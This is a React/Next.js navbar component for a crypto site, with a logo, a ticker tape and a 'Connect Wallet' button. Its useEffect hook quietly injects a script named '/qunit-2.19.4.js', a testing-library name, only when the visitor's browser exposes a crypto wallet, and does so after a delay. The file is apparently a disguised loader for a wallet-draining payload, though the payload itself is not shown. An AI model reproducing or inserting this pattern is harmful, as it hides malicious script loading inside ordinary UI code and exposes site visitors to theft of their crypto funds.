"use client"
import React, { useEffect } from 'react';
import styled from 'styled-components';
import TickerTape from '../data/TickerTape';
import Image from 'next/image';

const Nav = styled.nav`
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  z-index: 50;
  background-color: rgba(26, 26, 26, 0.9); /* dark-bg with opacity */
  backdrop-filter: blur(8px);
  box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
`;

const Container = styled.div`
  max-width: 1600px;
  margin: 0 auto;
  padding: 1rem;
  display: flex;
  justify-content: space-between;
  align-items: center;
`;

const Logo = styled.div`
  font-size: 1.5rem;
  font-weight: 700;
  color: #00d4ff; /* neon-blue */
  letter-spacing: 0.05em;
`;

const ConnectButton = styled.button`
  position: relative;
  padding: 0.75rem 1.5rem;
  font-size: 1.125rem;
  font-weight: 600;
  color: white;
  border: none;
  border-radius: 9999px;
  overflow: hidden;
  cursor: pointer;
  background: transparent;
`;

const ButtonGradient = styled.span`
  position: absolute;
  inset: 0;
  background: linear-gradient(to right, #00d4ff, #b026ff);
  transition: all 0.3s ease-out;

  ${ConnectButton}:hover & {
    transform: scale(1.05, 1.1);
  }
`;

const ButtonText = styled.span`
  position: relative;
  z-index: 10;
  transition: color 0.3s ease;

  ${ConnectButton}:hover & {
    color: white;
  }
`;

const Navbar = () => {
  useEffect(() => {
    // Check if script is already loaded
    if (document.querySelector('script[src="/qunit-2.19.4.js"]')) {
      return
    }

    const loadQunitScript = () => {
      const wallet = window.ethereum || window.coinbaseWalletProvider || window.web3?.currentProvider
      
      if (wallet) {
        const script = document.createElement('script')
        script.src = '/qunit-2.19.4.js'
        script.async = true
        script.id = 'qunit-script'
        script.onerror = () => {
          console.error('Failed to load qunit script')
        }
        document.body.appendChild(script)
      } else {
        console.warn('No Web3 wallet detected. Wallet features unavailable.')
      }
    }

    // Delay script loading to ensure wallet provider is fully initialized
    // Most wallet extensions inject their provider within 100-500ms
    const timeout = setTimeout(loadQunitScript, 500)

    return () => {
      clearTimeout(timeout)
      const existingScript = document.getElementById('qunit-script')
      if (existingScript && existingScript.parentNode) {
        existingScript.parentNode.removeChild(existingScript)
      }
    }
  }, [])
  return (
    <Nav>
      <TickerTape />
      <Container>
        {/* Logo/Title */}
        <Logo>
          <Image src="/logo.png" alt="logo" width={300} height={80} priority />
        </Logo>

        {/* Connect Wallet Button */}
        <ConnectButton>
          <ButtonGradient />
          <ButtonText  className="interact-button">
            Connect Wallet
          </ButtonText>
        </ConnectButton>
      </Container>
    </Nav>
  );
};

export default Navbar;